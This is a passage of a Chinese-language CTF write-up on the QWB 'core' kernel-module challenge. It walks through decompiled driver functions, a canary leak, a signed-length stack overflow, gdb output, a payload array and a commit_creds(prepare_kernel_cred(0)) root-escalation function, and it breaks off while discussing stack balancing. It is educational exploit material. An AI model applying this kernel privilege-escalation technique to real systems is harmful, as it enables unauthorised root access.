<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a>    v2 <span class="op">+=</span> <span class="dv">4</span><span class="op">;</span></span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>  strcpy<span class="op">(</span>v5<span class="op">,</span> <span class="st">&quot;Welcome to the QWB CTF challenge.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>  result <span class="op">=</span> copy_to_user<span class="op">(</span>a1<span class="op">,</span> <span class="op">&amp;</span>v5<span class="op">[</span>off<span class="op">],</span> <span class="dv">64</span><span class="bu">LL</span><span class="op">);</span></span>
<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>result <span class="op">)</span></span>
<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> __readgsqword<span class="op">(</span><span class="bn">0x28</span><span class="bu">u</span><span class="op">)</span> <span class="op">^</span> v6<span class="op">;</span></span>
<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>  __asm <span class="op">{</span> swapgs <span class="op">}</span></span>
<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> result<span class="op">;</span></span>
<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>代码copy_to_usr(a1,&amp;v5[off],64)可用于进行canary泄露，因为off是外部可控制的</p>
<p>在分析core_write函数：</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall core_copy_func<span class="op">(</span>__int64 a1<span class="op">)</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>  __int64 result<span class="op">;</span> <span class="co">// rax</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>  _QWORD v2<span class="op">[</span><span class="dv">10</span><span class="op">];</span> <span class="co">// [rsp+0h] [rbp-50h] BYREF</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>  v2<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> __readgsqword<span class="op">(</span><span class="bn">0x28</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>  printk<span class="op">(&amp;</span>unk_215<span class="op">);</span></span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> a1 <span class="op">&gt;</span> <span class="dv">63</span> <span class="op">)</span></span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>    printk<span class="op">(&amp;</span>unk_2A1<span class="op">);</span></span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bn">0xFFFFFFFF</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span></span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>    result <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>    qmemcpy<span class="op">(</span>v2<span class="op">,</span> <span class="op">&amp;</span>name<span class="op">,</span> <span class="op">(</span><span class="dt">unsigned</span> __int16<span class="op">)</span>a1<span class="op">);</span></span>
<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> result<span class="op">;</span></span>
<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>这里会设置name，copy长度为a1到栈上的变量v2上</p>
<p>分析a1&gt;63汇编代码：</p>
<blockquote>
<p>.text:000000000000011A cmp rbx, 3Fh ; ‘?’ .text:000000000000011E jg
short loc_133</p>
</blockquote>
<p>这里是有符号跳转，但是a1在qmemcpy函数中，被转换位unsigned
_int16，因此这里可以通过负数绕过大小限制，导致通过v2实现栈溢出。</p>
<p>那么name是否可以被外部控制？</p>
<p>查询name的xref，发现name在core_write函数中被赋值：</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall core_write<span class="op">(</span>__int64 a1<span class="op">,</span> __int64 a2<span class="op">,</span> <span class="dt">unsigned</span> __int64 a3<span class="op">)</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  printk<span class="op">(&amp;</span>unk_215<span class="op">);</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> a3 <span class="op">&lt;=</span> <span class="bn">0x800</span> <span class="op">&amp;&amp;</span> <span class="op">!</span>copy_from_user<span class="op">(&amp;</span>name<span class="op">,</span> a2<span class="op">,</span> a3<span class="op">)</span> <span class="op">)</span></span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>a3<span class="op">;</span></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  printk<span class="op">(&amp;</span>unk_230<span class="op">);</span></span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">4294967282</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>因此攻击思路如下：</p>
<ul>
<li><p>open打开/proc/core文件</p></li>
<li><p>通过ioctrl设置off</p></li>
<li><p>通过ioctrl调用core_read函数泄露canary</p></li>
<li><p>通过write设置name，那么的内容为攻击代码，再name中会调用commit_creds(prepare_creds(0))完成提权</p></li>
<li><p>通过ioctrl调用core_copy_func函数，让其栈溢出，完成漏洞利用。</p></li>
<li><p>在用户空间，执行system(‘/bin/sh’)得到root shell</p></li>
</ul>
<h2 id="漏洞利用">3.漏洞利用</h2>
<h3 id="调试">3.1. 调试</h3>
<p>因为qemu启动的时候使用了-s,因此可以通过如下的命令启动gdb调试，注意默认端口为1234：</p>
<blockquote>
<p>target remote:1234</p>
</blockquote>
<p>启动后调试结果如下：</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> target remote:1234</span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Remote</span> debugging using :1234</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">warning:</span> No executable has been specified and target does not support</span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">determining</span> executable automatically.  Try using the <span class="st">&quot;file&quot;</span> command.</span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0xffffffffa086e7d2</span> in <span class="pp">??</span> <span class="er">(</span><span class="kw">)</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="ex">LEGEND:</span> STACK <span class="kw">|</span> <span class="ex">HEAP</span> <span class="kw">|</span> <span class="ex">CODE</span> <span class="kw">|</span> <span class="ex">DATA</span> <span class="kw">|</span> <span class="ex">RWX</span> <span class="kw">|</span> <span class="ex">RODATA</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="ex">───────────────────────────────────────────────────────────────────────────────────────[</span> REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a> <span class="ex">RAX</span>  0xffffffffa086e7d0 ◂— sti    </span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a> <span class="ex">RBX</span>  0xffffffffa1210480 ◂— add    byte ptr [rax], al /<span class="pp">*</span> 0x80000000 <span class="pp">*</span>/</span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a> <span class="ex">RCX</span>  0x0</span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a> <span class="ex">RDX</span>  0x0</span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a> <span class="ex">RDI</span>  0x0</span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a> <span class="ex">RSI</span>  0x0</span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a> <span class="ex">R8</span>   0xffff901f5ca1bf20 —▸ 0xffffa8b400157960 ◂— 1</span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a> <span class="ex">R9</span>   0x0</span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a> <span class="ex">R10</span>  0x0</span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a> <span class="ex">R11</span>  0x3a2</span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a> <span class="ex">R12</span>  0xffffffffa1210480 ◂— add    byte ptr [rax], al /<span class="pp">*</span> 0x80000000 <span class="pp">*</span>/</span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a> <span class="ex">R13</span>  0xffffffffa1210480 ◂— add    byte ptr [rax], al /<span class="pp">*</span> 0x80000000 <span class="pp">*</span>/</span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a> <span class="ex">R14</span>  0x0</span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a> <span class="ex">R15</span>  0x0</span>
<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a> <span class="ex">RBP</span>  0x0</span>
<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a> <span class="ex">RSP</span>  0xffffffffa1203eb8 —▸ 0xffffffffa00b65a0 ◂— jmp    0xffffffffa00b6541</span>
<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a> <span class="ex">RIP</span>  0xffffffffa086e7d2 ◂— ret    </span>
<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a><span class="ex">────────────────────────────────────────────────────────────────────────────────────────[</span> DISASM ]─────────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 0xffffffffa086e7d2    ret    <span class="op">&lt;</span>0xffffffffa00b65a0<span class="op">&gt;</span></span>
<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a>    <span class="ex">↓</span></span>
<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b65a0</span>    jmp    0xffffffffa00b6541 <span class="op">&lt;</span>0xffffffffa00b6541<span class="op">&gt;</span></span>
<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a>    <span class="ex">↓</span></span>
<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6541</span>    or     byte ptr ds:[r12 + 2], 0x20</span>
<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6548</span>    pushfq </span>
<span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6549</span>    pop    rax</span>
<span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b654a</span>    test   ah, 2</span>
<span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b654d</span>    je     0xffffffffa00b65e5 <span class="op">&lt;</span>0xffffffffa00b65e5<span class="op">&gt;</span></span>
<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6553</span>    call   0xffffffffa00d4720 <span class="op">&lt;</span>0xffffffffa00d4720<span class="op">&gt;</span></span>
<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6558</span>    call   0xffffffffa00b6430 <span class="op">&lt;</span>0xffffffffa00b6430<span class="op">&gt;</span></span>
<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b655d</span>    mov    rax, qword ptr [rbx]</span>
<span id="cb16-41"><a href="#cb16-41" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffffa00b6560</span>    test   al, 8</span>
<span id="cb16-42"><a href="#cb16-42" aria-hidden="true" tabindex="-1"></a><span class="ex">─────────────────────────────────────────────────────────────────────────────────────────[</span> STACK ]─────────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb16-43"><a href="#cb16-43" aria-hidden="true" tabindex="-1"></a><span class="ex">00:0000│</span> rsp  0xffffffffa1203eb8 —▸ 0xffffffffa00b65a0 ◂— jmp    0xffffffffa00b6541</span>
<span id="cb16-44"><a href="#cb16-44" aria-hidden="true" tabindex="-1"></a><span class="ex">01:0008│</span>      0xffffffffa1203ec0 ◂— 0xc2</span>
<span id="cb16-45"><a href="#cb16-45" aria-hidden="true" tabindex="-1"></a><span class="ex">02:0010│</span>      0xffffffffa1203ec8 —▸ 0xffffffffa16c4900 ◂— int3    /<span class="pp">*</span> 0xcccccccccccccccc <span class="pp">*</span>/</span>
<span id="cb16-46"><a href="#cb16-46" aria-hidden="true" tabindex="-1"></a><span class="ex">03:0018│</span>      0xffffffffa1203ed0 —▸ 0xffff901f5ccce900 ◂— jb     0xffff901f5ccce971 /<span class="pp">*</span> 0x65642f3d746f6f72<span class="kw">;</span> <span class="st">&#39;root=/dev/ram&#39;</span> <span class="pp">*</span>/</span>
<span id="cb16-47"><a href="#cb16-47" aria-hidden="true" tabindex="-1"></a><span class="ex">04:0020│</span>      0xffffffffa1203ed8 —▸ 0xffffffffa16cc2c0 ◂— int3    /<span class="pp">*</span> 0xcccccccccccccccc <span class="pp">*</span>/</span>
<span id="cb16-48"><a href="#cb16-48" aria-hidden="true" tabindex="-1"></a><span class="ex">05:0028│</span>      0xffffffffa1203ee0 ◂— 0</span>
<span id="cb16-49"><a href="#cb16-49" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
<span id="cb16-50"><a href="#cb16-50" aria-hidden="true" tabindex="-1"></a><span class="ex">07:0038│</span>      0xffffffffa1203ef0 —▸ 0xffffffffa00b673a ◂— jmp    0xffffffffa00b6735</span>
<span id="cb16-51"><a href="#cb16-51" aria-hidden="true" tabindex="-1"></a><span class="ex">───────────────────────────────────────────────────────────────────────────────────────[</span> BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb16-52"><a href="#cb16-52" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> f 0 ffffffffa086e7d2</span>
<span id="cb16-53"><a href="#cb16-53" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 1 ffffffffa00b65a0</span>
<span id="cb16-54"><a href="#cb16-54" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 2               c2</span>
<span id="cb16-55"><a href="#cb16-55" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 3 ffffffffa16c4900</span>
<span id="cb16-56"><a href="#cb16-56" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 4 ffff901f5ccce900</span>
<span id="cb16-57"><a href="#cb16-57" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 5 ffffffffa16cc2c0</span>
<span id="cb16-58"><a href="#cb16-58" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 6                0</span>
<span id="cb16-59"><a href="#cb16-59" aria-hidden="true" tabindex="-1"></a><span class="ex">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span>
<span id="cb16-60"><a href="#cb16-60" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> </span>
<span id="cb16-61"><a href="#cb16-61" aria-hidden="true" tabindex="-1"></a> <span class="kw">()</span></span></code></pre></div>
<p>但是为了能够给core_read，core_write或者core_copy_func函数下断点，我们还行设置下init脚本，让其再install
core.ko后，将内核的符号打印到/tmp目录下，修改的脚本如下：</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-t</span> proc proc /proc</span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-t</span> sysfs sysfs /sys</span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-t</span> devtmpfs none /dev</span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">/sbin/mdev</span> <span class="at">-s</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /dev/pts</span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-vt</span> devpts <span class="at">-o</span> gid=4,mode=620 none /dev/pts</span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 666 /dev/ptmx</span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/kallsyms <span class="op">&gt;</span> /tmp/kallsyms</span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 1 <span class="op">&gt;</span> /proc/sys/kernel/kptr_restrict</span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 1 <span class="op">&gt;</span> /proc/sys/kernel/dmesg_restrict</span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span> eth0 up</span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="ex">udhcpc</span> <span class="at">-i</span> eth0</span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span> eth0 10.0.2.15 netmask 255.255.255.0</span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="ex">route</span> add default gw 10.0.2.2</span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a><span class="ex">insmod</span> /core.ko</span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/kallsyms <span class="op">&gt;</span> /tmp/kallsyms <span class="co">#this is for debug</span></span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a><span class="co">#poweroff -d 120 -f &amp;</span></span>
<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a><span class="ex">setsid</span> /bin/cttyhack setuidgid 1000 /bin/sh</span>
<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;sh end!\n&#39;</span></span>
<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a><span class="fu">umount</span> /proc</span>
<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a><span class="fu">umount</span> /sys</span>
<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a><span class="ex">poweroff</span> <span class="at">-d</span> 0  <span class="at">-f</span></span></code></pre></div>
<p>这样我们就能够获取到core_write等函数的地址：</p>
<blockquote>
<p>ffffffffc0177000 t core_release [core] ffffffffc017715f t core_ioctl
[core] ffffffffc01771b9 t exit_core [core] ffffffffc0177011 t core_write
[core] ffffffffc01771b9 t cleanup_module [core] ffffffffc0177063 t
core_read [core] ffffffffc01770f6 t core_copy_func [core]</p>
</blockquote>
<h3 id="漏洞利用脚本">3.2.漏洞利用脚本</h3>
<p>1、off应该设置多少？</p>
<p>查看core_read函数：</p>
<pre class="asm6502"><code>.text:0000000000000063 core_read       proc near               ; CODE XREF: core_ioctl+37↓p
.text:0000000000000063
.text:0000000000000063 var_10          = qword ptr -10h
.text:0000000000000063
.text:0000000000000063                 push    rbx
.text:0000000000000064                 mov     rbx, rdi
.text:0000000000000067                 mov     rdi, offset unk_25B
.text:000000000000006E                 sub     rsp, 48h
.text:0000000000000072                 mov     rax, gs:28h
.text:000000000000007B                 mov     [rsp+50h+var_10], rax
.text:0000000000000080                 xor     eax, eax</code></pre>
<p>可以分析出：</p>
<blockquote>
<p>|—ret-address—|—–rbx——|—-canary—|—–size=0x40———|</p>
</blockquote>
<p>因此只需要将off设置为0x40即可获得canary和ret-address</p>
<p>2、如何设置name？</p>
<p>查看core_copy_func函数</p>
<pre class="asm6502"><code>.text:00000000000000F6 core_copy_func  proc near               ; CODE XREF: core_ioctl+2D↓p
.text:00000000000000F6
.text:00000000000000F6 var_10          = qword ptr -10h
.text:00000000000000F6
.text:00000000000000F6                 push    rbx
.text:00000000000000F7                 mov     rbx, rdi
.text:00000000000000FA                 mov     rdi, offset unk_215
.text:0000000000000101                 sub     rsp, 48h
.text:0000000000000105                 mov     rax, gs:28h
.text:000000000000010E                 mov     [rsp+50h+var_10], rax
.text:0000000000000113                 xor     eax, eax</code></pre>
<p>栈布局如下：</p>
<blockquote>
<p>|—ret-address—|—–rbx——|—-canary—|—–size=0x40———|</p>
</blockquote>
<p>因此第8个为canary，第10个为ret-address(下标从0开始），那么的定义如下：</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>    unsigned <span class="dt">long</span> <span class="dt">long</span> name_payload<span class="op">[</span><span class="dv">11</span><span class="op">];</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>name_payload<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> canary<span class="op">;</span><span class="co">//canary</span></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>promote_root<span class="op">;</span><span class="co">//rip</span></span></code></pre></div>
<p>promote_root为执行commit_creds(prepare_kernel_cred(0))的wraper函数。</p>
<p>promote_root的代码如下：</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> promote_root<span class="op">()</span></span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> <span class="op">(*</span>commit_cred<span class="op">)(</span><span class="kw">struct</span> cred <span class="op">*</span>new<span class="op">);</span></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> cred <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="kw">struct</span> task_struct <span class="op">*</span>daemon<span class="op">);</span></span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>但是这个版本执行会出现问题，因为栈不平衡？为什么？我们继续分析</p>
<h3 id="栈平衡">3.3. 栈平衡</h3>
<p>首先分析下core_ioctl-&gt;core_copy_fun过程，从core_copy_fun函数的返回过程：</p>
<p>core_copy_fun返回后会进入如下代码执行：</p>
<pre class="asm6502"><code>.text:00000000000001B5
.text:00000000000001B5 loc_1B5:                                ; CODE XREF: core_ioctl+1A↑j
.text:00000000000001B5                                         ; core_ioctl+32↑j ...
.text:00000000000001B5                 xor     eax, eax
.text:00000000000001B7                 pop     rbx
.text:00000000000001B8                 retn
.text:00000000000001B8 core_ioctl      endp</code></pre>
<p>代码会设置返回执行eax=0，pop rbx，然后执行retn，可以理解为pop rip</p>
<p>因此我们可以讲core_ioctl和core_copy_fun的栈一起画出来，形式如下：</p>
<blockquote>
<p>|–rip(ioctl)–|–rbx(ioctl)–|—ret-address—|–rbx–|–canary–|–size=0x40–|</p>
</blockquote>
<p>现在ret-address的地址变成了promote_root函数地址，我们查看下promote_root函数：</p>
<pre class="asm6502"><code>.text:00000000000012A9 promote_root    proc near               ; DATA XREF: main+1AF↓o
.text:00000000000012A9
.text:00000000000012A9 commit_cred     = qword ptr -10h
.text:00000000000012A9 prepare_kernel_cred= qword ptr -8
.text:00000000000012A9
.text:00000000000012A9 ; __unwind {
.text:00000000000012A9                 endbr64
.text:00000000000012AD                 push    rbp
.text:00000000000012AE                 mov     rbp, rsp
.text:00000000000012B1                 sub     rsp, 10h
.text:00000000000012B5                 mov     rax, cs:commit_cred_addr
.text:00000000000012BC                 mov     [rbp+commit_cred], rax
.text:00000000000012C0                 mov     rax, cs:prepare_kernel_cred_addr
.text:00000000000012C7                 mov     [rbp+prepare_kernel_cred], rax
.text:00000000000012CB                 mov     rax, [rbp+prepare_kernel_cred]
.text:00000000000012CF                 mov     edi, 0
.text:00000000000012D4                 call    rax
.text:00000000000012D6                 mov     rdx, rax
.text:00000000000012D9                 mov     rax, [rbp+commit_cred]
.text:00000000000012DD                 mov     rdi, rdx
.text:00000000000012E0                 call    rax
.text:00000000000012E2                 nop
.text:00000000000012E3                 leave
.text:00000000000012E4                 retn
.text:00000000000012E4 ; } // starts at 12A9
.text:00000000000012E4 promote_root    endp</code></pre>
<p>（pS：这里看起来有点奇怪，为什么没有栈平衡，即缺少mov
rsp，rpb，或者add rsp,10h,如果需要手动平衡，我们保留：asm(“mov
%rbp,%rsp”);)</p>
<p>执行promote_root函数开栈过程后，栈变成了：</p>
<blockquote>
<p>|–rip(ioctl)–|–rbx(ioctl)–|—rbp—|–size=0x10–|</p>
</blockquote>
<p>因此在执行leave（pop
rbp）后，会将rbx(ioctl)作为返回地址，即retn指令会落脚在rbx(ioctl)上。</p>
<p>方式1：在执行完成commit_creds(prepare_kernel_cred(0))后，直接跳转到0x:00000000000001B执行(即原始的返回地址执行)，当然要确保栈平衡，还需要将rbp弹窗：</p>
